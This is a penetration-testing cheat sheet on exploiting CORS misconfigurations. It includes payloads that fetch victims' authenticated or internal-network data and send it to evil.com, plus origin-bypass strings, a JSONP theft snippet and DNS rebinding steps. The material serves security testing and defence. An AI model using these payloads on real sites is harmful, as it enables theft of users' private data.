# CORS Misconfigurations

CORS misconfigurations allow attackers to bypass Same-Origin Policy, enabling cross-origin data theft and actions on behalf of authenticated users.

## Quick Test

```http
# Send request with attacker Origin
GET /api/user HTTP/1.1
Origin: https://evil.com

# Check response headers
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
# If both present → Exploitable
```

## Vulnerable Patterns

```http
# Reflects any origin
Origin: https://evil.com → ACAO: https://evil.com

# Allows null
Origin: null → ACAO: null

# Weak regex
Origin: https://target.com.evil.com → ACAO: https://target.com.evil.com
```

## Attack Vectors

### 1. Origin Reflection with Credentials

```html
<script>
fetch('https://target.com/api/user', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  new Image().src = 'https://evil.com/steal?d=' + btoa(JSON.stringify(data));
});
</script>
```

### 2. Null Origin Exploitation

Sandboxed iframes send `Origin: null`:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
  srcdoc="<script>
    fetch('https://target.com/api/sensitive',{credentials:'include'})
    .then(r=>r.text())
    .then(d=>location='https://evil.com/?'+btoa(d))
  </script>">
</iframe>
```

### 3. Regex Bypass Techniques

**Suffix bypass:**
```
# If regex checks endsWith('target.com')
Origin: https://eviltarget.com
Origin: https://nottarget.com
```

**Prefix bypass:**
```
# If regex checks startsWith('https://target')
Origin: https://target.evil.com
```

**Special characters:**
```
Origin: https://target_application.evil.com   # Underscore (Chrome/Firefox)
Origin: https://target}.evil.com              # Curly brace (Safari)
Origin: https://target.com@evil.com           # Authority confusion
Origin: https://evil.com#target.com           # Fragment
```

### 4. Subdomain Trust Exploitation

```
1. Find XSS or takeover on sub.target.com
2. Host exploit on sub.target.com
3. Make cross-origin requests to main target.com
4. Credentials included, data accessible
```

### 5. Internal Network Access

Victim's browser can reach internal resources:

```javascript
fetch('http://192.168.1.1/admin/config', {credentials:'include'})
.then(r=>r.text())
.then(d=>fetch('https://evil.com/exfil',{method:'POST',body:d}))
```

**0.0.0.0 bypass (Linux):**
```http
# Bypasses local network checks
Origin: https://evil.com
# Request to http://0.0.0.0:8080/admin
```

### 6. JSONP Fallback

If CORS blocked but JSONP available:

```html
<script>
function callback(data) {
  new Image().src = 'https://evil.com/steal?d=' + JSON.stringify(data);
}
</script>
<script src="https://target.com/api/user?callback=callback"></script>
```

### 7. DNS Rebinding

```
1. Attacker controls evil.com DNS
2. First resolution: evil.com → attacker IP
3. Victim loads attacker page
4. DNS TTL expires, rebind to target IP
5. JavaScript now reaches target IP with evil.com origin
```

## Bypasses

**Origin format tricks:**
```
Origin: HTTPS://TARGET.COM          # Case
Origin: https://target.com:443      # Port
Origin: http://target.com           # Protocol
```

**Bypass preflight (simple request):**
```
Content-Type: text/plain
# Only GET, HEAD, POST without custom headers
```

## Impact Scale

| Scenario | Impact |
|----------|--------|
| ACAO reflects + ACAC: true | **Critical** — Full data theft |
| ACAO: null + ACAC: true | **High** — Data theft via iframe |
| Subdomain wildcard | **Medium-High** — Depends on subdomain security |
| ACAO: * (no credentials) | **Low** — No credentials sent |

## Tools

- **CORScanner** — Automated CORS testing
- **Corsy** — CORS misconfiguration scanner
- **Singularity** — DNS rebinding tool
- **Caido** — Manual Origin manipulation

## Checklist

- [ ] Test with arbitrary attacker origin
- [ ] Test with null origin (sandboxed iframe)
- [ ] Test with subdomain variations
- [ ] Check if credentials allowed (ACAC: true)
- [ ] Test regex bypasses (prefix/suffix)
- [ ] Check for XSS on trusted subdomains
- [ ] Test special characters in origin
- [ ] Check JSONP fallback availability
- [ ] Test internal network access via victim browser
- [ ] Verify Vary: Origin header present
